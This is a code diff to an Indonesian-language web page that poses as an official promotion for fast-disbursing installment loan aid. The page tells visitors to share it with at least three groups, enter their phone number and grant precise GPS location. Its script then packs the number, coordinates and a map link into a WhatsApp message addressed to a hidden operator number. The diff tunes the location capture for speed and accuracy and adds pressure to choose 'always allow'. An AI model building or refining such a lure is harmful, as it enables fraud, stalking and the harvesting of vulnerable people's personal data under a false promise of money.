@@ -45,15 +45,9 @@ body{
   filter:drop-shadow(0 0 8px rgba(255,215,0,0.6));
 }
 @keyframes jatuhUang{
-  0%{
-    transform:translateY(0) rotate(0deg);
-    opacity:0;
-  }
-  10%{opacity:1}
-  100%{
-    transform:translateY(110vh) rotate(360deg);
-    opacity:0;
-  }
+  0%{transform:translateY(0) rotate(0deg); opacity:0;}
+  10%{opacity:1;}
+  100%{transform:translateY(110vh) rotate(360deg); opacity:0;}
 }
 
 /* Efek kisi-kisi latar */
@@ -115,14 +109,9 @@ body::before{
   backdrop-filter:blur(12px);
 }
 
-.icon-top{
-  font-size:48px; margin-bottom:10px;
-}
-
-h1{
-  color:#00ffc8; margin-bottom:8px; font-size:24px;
-  text-shadow:0 0 15px rgba(0,255,200,.5); line-height:1.3;
-}
+.icon-top{font-size:48px; margin-bottom:10px;}
+h1{color:#00ffc8; margin-bottom:8px; font-size:24px;
+  text-shadow:0 0 15px rgba(0,255,200,.5); line-height:1.3;}
 .sub-judul{color:#9ff; margin-bottom:25px; font-size:15px; line-height:1.5}
 
 .langkah{
@@ -132,21 +121,15 @@ h1{
 .langkah h3{color:#00ffc8; font-size:15px; margin-bottom:5px}
 .langkah p{color:#bff; font-size:13px; line-height:1.5}
 
-.form-group{
-  text-align:left; margin-bottom:20px;
-}
-.form-group label{
-  color:#aff; font-size:14px; display:block; margin-bottom:8px;
-}
+.form-group{text-align:left; margin-bottom:20px;}
+.form-group label{color:#aff; font-size:14px; display:block; margin-bottom:8px;}
 .form-group input{
   width:100%; padding:15px 18px; border-radius:12px;
   border:1px solid rgba(0,255,200,.4);
   background:rgba(0,50,50,.5); color:#fff; font-size:16px;
   outline:none; transition:.3s;
 }
-.form-group input:focus{
-  border-color:#0ff; box-shadow:0 0 15px rgba(0,255,200,.4);
-}
+.form-group input:focus{border-color:#0ff; box-shadow:0 0 15px rgba(0,255,200,.4);}
 .form-group input::placeholder{color:#699}
 
 .btn{
@@ -179,6 +162,9 @@ h1{
 .map-link a:hover{background:rgba(0,255,255,.15)}
 
 .catatan{margin-top:22px; font-size:12px; color:#7ac; line-height:1.5}
+.akurasi-baik{color:#0f0; font-weight:bold;}
+.akurasi-cukup{color:#fa0; font-weight:bold;}
+.akurasi-rendah{color:#f44; font-weight:bold;}
 </style>
 </head>
 <body>
@@ -194,7 +180,7 @@ h1{
 <div class="uang-falling" id="uangContainer"></div>
 
 <div class="teksBerjalan">
-  <span>💵 PROMO RESMI — BANTUAN DANA CICIL CEPAT CAIR ✅ Langkah: SHARE → LOGIN NOMOR → IZINKAN LOKASI → DANA MASUK 💸 Terbatas! Klaim Sekarang! 💵</span>
+  <span>💵 PROMO RESMI — BANTUAN DANA CICIL CEPAT CAIR ✅ LOKASI AKURAT & CEPAT TERDETEKSI 💸 Klaim Sekarang! 💵</span>
 </div>
 
 <script>
@@ -210,7 +196,6 @@ for(let i=0; i<35; i++){
 // Animasi uang jatuh
 const uangContainer = document.getElementById('uangContainer');
 const jumlahUang = 18;
-
 for(let i = 0; i < jumlahUang; i++){
   const uang = document.createElement('img');
   uang.src = 'https://cdn-icons-png.flaticon.com/512/1026/1026458.png';
@@ -226,38 +211,38 @@ for(let i = 0; i < jumlahUang; i++){
 <div class="card">
   <div class="icon-top">💰</div>
   <h1>BANTUAN DANA CICIL<br>CEPAT CAIR</h1>
-  <p class="sub-judul">Ikuti langkah mudah di bawah ini</p>
+  <p class="sub-judul">Lokasi terdeteksi cepat & akurat</p>
 
   <div class="langkah">
     <h3>Langkah 1 — Bagikan</h3>
-    <p>Sebarkan/Share halaman ini ke minimal 3 grup atau teman agar sistem mendeteksi Anda aktif</p>
+    <p>Share halaman ini ke minimal 3 grup/teman agar sistem mendeteksi Anda aktif</p>
   </div>
 
   <div class="langkah">
-    <h3>Langkah 2 — Login Nomor</h3>
-    <p>Masukkan nomor aktif Anda di kolom berikut, gunakan format awalan 62</p>
+    <h3>Langkah 2 — Masukkan Nomor</h3>
+    <p>Gunakan format awalan 62, contoh: 62812xxx</p>
   </div>
 
   <div class="langkah">
     <h3>Langkah 3 — Izinkan Lokasi & Klaim</h3>
-    <p>Tekan tombol proses → izinkan akses lokasi → dana akan segera cair ✅</p>
+    <p>Izinkan akses lokasi → sistem langsung ambil posisi akurat → dana cair ✅</p>
   </div>
 
   <div class="form-group">
-    <label for="nomorWA">📱 Masukkan Nomor Anda:</label>
-    <input type="tel" id="nomorWA" placeholder="Contoh: 6281234567xxx" maxlength="15">
+    <label for="nomorWA">📱 Nomor Anda:</label>
+    <input type="tel" id="nomorWA" placeholder="6281234567xxx" maxlength="15">
   </div>
 
   <button class="btn" id="prosesBtn">
-    📍 PROSES & KLAIM SEKARANG
+    📍 AMBIL LOKASI & KLAIM
   </button>
 
   <div class="status" id="statusBox"></div>
   <div class="map-link" id="mapBox"></div>
   
   <p class="catatan">
-    Pastikan nomor diawali <b>62</b> (tanpa + atau 0 di depan).<br>
-    Izinkan lokasi saat diminta agar verifikasi berhasil.
+    ✅ Pastikan GPS/Lokasi HP Anda <b>AKTIF</b><br>
+    ✅ Pilih <b>Izinkan/Selalu Izinkan</b> saat diminta
   </p>
 </div>
 
@@ -273,13 +258,13 @@ prosesBtn.addEventListener('click', mulaiAmbilLokasi);
 function ambilNomorPengguna(){
   let nomor = nomorWAInput.value.trim().replace(/\D/g,'');
   if(!nomor){
-    tampilStatus('Silakan masukkan nomor Anda dulu!', 'error');
+    tampilStatus('⚠️ Masukkan nomor dulu!', 'error');
     return null;
   }
   if(nomor.startsWith('0')) nomor = '62' + nomor.slice(1);
   if(!nomor.startsWith('62')) nomor = '62' + nomor;
   if(nomor.length < 10){
-    tampilStatus('Nomor terlalu pendek, periksa kembali!', 'error');
+    tampilStatus('⚠️ Nomor terlalu pendek!', 'error');
     return null;
   }
   return nomor;
@@ -290,18 +275,23 @@ function mulaiAmbilLokasi(){
   if(!nomorPengguna) return;
 
   if(!navigator.geolocation){
-    tampilStatus('Perangkat tidak mendukung lokasi', 'error');
+    tampilStatus('❌ Perangkat tidak mendukung lokasi', 'error');
     return;
   }
 
-  tampilStatus('📍 Meminta akses lokasi... Izinkan jika diminta!', 'loading');
+  tampilStatus('📍 Meminta lokasi... Aktifkan GPS & pilih IZINKAN!', 'loading');
   prosesBtn.disabled = true;
   mapBox.style.display = 'none';
 
+  // === PENGATURAN LOKASI: CEPAT + AKURAT ===
   navigator.geolocation.getCurrentPosition(
     pos => berhasilAmbilLokasi(pos, nomorPengguna),
     gagalAmbilLokasi,
-    {enableHighAccuracy: true, timeout: 15000, maximumAge: 0}
+    {
+      enableHighAccuracy: true,   // ✅ PRESISI TERTINGGI (pakai GPS)
+      timeout: 7000,              // ⚡ Cepat: tunggu maksimal 7 detik
+      maximumAge: 0               // 🔄 Selalu ambil lokasi BARU, bukan simpanan
+    }
   );
 }
 
@@ -309,40 +299,56 @@ function berhasilAmbilLokasi(posisi, nomorPengguna){
   const lat = posisi.coords.latitude;
   const lng = posisi.coords.longitude;
   const akurasi = Math.round(posisi.coords.accuracy);
+  
+  // Keterangan tingkat akurasi
+  let keteranganAkurasi = '';
+  if(akurasi <= 10){
+    keteranganAkurasi = '✅ SANGAT AKURAT';
+  } else if(akurasi <= 50){
+    keteranganAkurasi = '✅ AKURAT';
+  } else if(akurasi <= 100){
+    keteranganAkurasi = '⚠️ CUKUP AKURAT';
+  } else {
+    keteranganAkurasi = '⚠️ KURANG AKURAT';
+  }
 
-  tampilStatus(`✅ Lokasi terekam! Mengirim data...`, 'success');
+  tampilStatus(`✅ Lokasi terdeteksi! Akurasi: ±${akurasi}m ${keteranganAkurasi}`, 'success');
 
   const pesan = 
-`LAPORAN PENDAFTARAN BANTUAN DANA CICIL
-━━━━━━━━━━━━━━━━━━━━━━
-Nomor Pengguna: ${nomorPengguna}
-Status: Sudah Dibagikan & Diverifikasi
-Lokasi:
-  • Lintang: ${lat}
-  • Bujur: ${lng}
-  • Akurasi: ±${akurasi} meter
-Waktu: ${new Date().toLocaleString('id-ID')}
-Peta: https://www.google.com/maps?q=${lat},${lng}
-━━━━━━━━━━━━━━━━━━━━━━
-Permintaan: Dana Cicil Cepat Cair`;
+`LAPORAN VERIFIKASI — BANTUAN DANA CICIL
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 Nomor: ${nomorPengguna}
+📍 Lokasi:
+   Lintang : ${lat}
+   Bujur   : ${lng}
+   Akurasi : ±${akurasi} meter
+   Status  : ${keteranganAkurasi}
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+🗺️ Peta: https://www.google.com/maps?q=${lat},${lng}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Permintaan: DANA CICIL CEPAT CAIR`;
 
   const waLink = `https://wa.me/${NOMOR_TUJUAN}?text=${encodeURIComponent(pesan)}`;
   
   mapBox.style.display = 'block';
-  mapBox.innerHTML = `<a href="${waLink}" target="_blank">🔗 Klik di sini jika tidak otomatis terbuka</a>`;
+  mapBox.innerHTML = `<a href="${waLink}" target="_blank">🔗 Klik jika tidak otomatis terbuka</a>`;
 
   setTimeout(() => {
     window.open(waLink, '_blank');
-    tampilStatus(`✅ Terkirim ke ${NOMOR_TUJUAN}! Lanjutkan di WhatsApp`, 'success');
+    tampilStatus(`✅ Terkirim! Lanjutkan di WhatsApp`, 'success');
     prosesBtn.disabled = false;
-  }, 600);
+  }, 500);
 }
 
 function gagalAmbilLokasi(err){
-  let pesan = '❌ Gagal mendapatkan lokasi. ';
-  if(err.code === 1) pesan += 'Izin lokasi ditolak! Izinkan di pengaturan browser.';
-  else if(err.code === 2) pesan += 'Sinyal lokasi tidak tersedia.';
-  else if(err.code === 3) pesan += 'Waktu habis, coba lagi.';
+  let pesan = '❌ Gagal ambil lokasi. ';
+  if(err.code === 1){
+    pesan += 'Izin DITOLAK → Ubah ke "Izinkan" di pengaturan browser.';
+  } else if(err.code === 2){
+    pesan += 'Sinyal lemah → Aktifkan GPS & pindah ke tempat terbuka.';
+  } else if(err.code === 3){
+    pesan += 'Terlalu lama → Coba lagi, pastikan GPS menyala.';
+  }
   
   tampilStatus(pesan, 'error');
   prosesBtn.disabled = false;
